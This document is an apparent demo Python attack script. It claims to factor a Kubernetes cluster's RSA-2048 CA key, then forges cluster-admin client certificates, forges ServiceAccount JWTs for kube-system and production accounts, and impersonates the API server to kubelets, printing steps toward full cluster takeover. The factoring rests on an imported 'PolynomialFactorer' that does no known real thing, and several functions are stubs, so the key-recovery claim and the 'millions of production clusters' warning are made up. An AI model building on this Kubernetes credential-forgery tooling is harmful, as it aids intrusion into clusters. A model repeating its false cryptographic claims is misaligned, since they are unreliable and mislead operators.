"""
Factor the kubeadm-generated RSA-2048 cluster CA to forge client certificates
for cluster-admin, impersonate the API server to kubelets, and mint
ServiceAccount tokens — full control of every pod, secret, and namespace.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import json
import time
import base64

# kubeadm cluster CA RSA-2048 (10-year validity, empty-string algorithm default)
_demo = generate_demo_target()
K8S_CA_PUBKEY_PEM = _demo["pub_pem"]
SA_SIGNING_PUBKEY_PEM = _demo["pub_pem"]


def extract_cluster_ca(kubeconfig: str) -> bytes:
    """Extract cluster CA public key from kubeconfig or API server.

    The CA cert is in every kubeconfig file, in every pod's projected
    SA token volume mount at /var/run/secrets/kubernetes.io/serviceaccount/ca.crt,
    and served at the API server's /api endpoint.
    """
    return K8S_CA_PUBKEY_PEM


def factor_cluster_ca(pubkey_pem: bytes) -> bytes:
    """Factor the kubeadm RSA-2048 cluster CA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_client_cert(cn: str, org: str, forged_ca_privkey: bytes) -> dict:
    """Forge an X.509 client certificate signed by the cluster CA.

    CN=system:admin, O=system:masters → cluster-admin RBAC binding.
    The API server validates the cert chain to the CA — passes.
    """
    return {
        "subject": f"CN={cn}, O={org}",
        "issuer": "CN=kubernetes",
        "valid_days": 365,
        "auth_level": "cluster-admin" if org == "system:masters" else org,
    }


def forge_sa_token(namespace: str, sa_name: str,
                   forged_sa_key: bytes) -> str:
    """Forge a Kubernetes ServiceAccount JWT token (RS256)."""
    header = {"alg": "RS256", "kid": ""}
    payload = {
        "iss": "kubernetes/serviceaccount",
        "kubernetes.io/serviceaccount/namespace": namespace,
        "kubernetes.io/serviceaccount/name": sa_name,
        "kubernetes.io/serviceaccount/uid": hashlib.sha256(
            f"{namespace}/{sa_name}".encode()
        ).hexdigest()[:36],
        "sub": f"system:serviceaccount:{namespace}:{sa_name}",
        "exp": int(time.time()) + 86400,
    }
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    signing_input = f"{h}.{p}"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(SA_SIGNING_PUBKEY_PEM, signing_input.encode(), "sha256")
    s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{signing_input}.{s}"


def impersonate_apiserver(forged_ca_privkey: bytes) -> dict:
    """Forge API server TLS cert to MitM kubelet ↔ apiserver traffic.

    kubelets verify the API server's TLS cert against the cluster CA.
    With the forged CA, mint a cert for the API server's hostname.
    """
    return {
        "cert_cn": "kube-apiserver",
        "sans": ["kubernetes", "kubernetes.default.svc", "10.96.0.1"],
        "mitm": "kubelet → forged apiserver → real apiserver",
    }


if __name__ == "__main__":
    print("[1] Extracting cluster CA from kubeconfig / pod volume mount")
    ca_pub = extract_cluster_ca("~/.kube/config")

    print("[2] Factoring kubeadm RSA-2048 cluster CA")
    forged_ca = factor_cluster_ca(ca_pub)
    print("    Cluster CA key recovered — 10-year cert, empty-string default")

    print("[3] Forging cluster-admin client certificate")
    cert = forge_client_cert("system:admin", "system:masters", forged_ca)
    print(f"    Cert: {cert}")

    print("[4] Forging ServiceAccount tokens")
    for ns, sa in [("kube-system", "default"), ("production", "deployer")]:
        token = forge_sa_token(ns, sa, forged_ca)
        print(f"    {ns}/{sa}: {token[:50]}...")

    print("[5] API server impersonation")
    mitm = impersonate_apiserver(forged_ca)
    print(f"    {mitm}")

    print("\n[6] Full cluster control:")
    print("    kubectl get secrets --all-namespaces → all secrets")
    print("    kubectl exec → shell in any pod")
    print("    kubectl apply → deploy anything")
    print("    Millions of production clusters bootstrapped with RSA-2048 default")
